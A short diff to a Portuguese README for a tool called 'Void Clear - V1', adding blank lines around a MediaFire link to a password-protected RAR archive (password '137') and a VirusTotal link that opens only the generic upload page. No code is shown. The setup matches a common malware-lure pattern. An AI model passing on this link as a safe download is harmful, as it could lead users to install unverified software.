@@ -28,7 +28,9 @@ O **Void Clear - V1** é uma ferramenta poderosa desenvolvida para automatizar a
 Painel **Void Clear - V1**
 
 [📁 • DOWNLOAD](https://www.mediafire.com/file/n6dv3bf08e0vpfs/VOID_CLEAR_-_V1.rar/file)
+
  📄 • SENHA PARA EXTRAIR: 137
+ 
 [🌐 • VIRUSTOTAL](https://www.virustotal.com/gui/home/upload)
 
 ---
